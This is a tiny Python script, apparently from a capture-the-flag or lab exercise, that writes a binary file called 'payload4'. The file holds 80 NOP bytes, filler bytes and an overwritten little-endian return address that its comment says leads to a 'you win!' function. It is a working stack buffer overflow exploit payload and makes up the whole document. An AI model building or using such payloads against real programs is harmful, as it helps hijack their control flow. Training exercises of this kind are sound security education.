with open('payload4','wb') as f:
    f.write(b'\x90'*80)
    f.write(b'BBBBCCCC')
    f.write(b'\x9b\x51\x55\x55\x55\x55') # RA address "you win!" 0x00 00 55 55 55 55 51 9b 
    f.close()

print("Payload created")

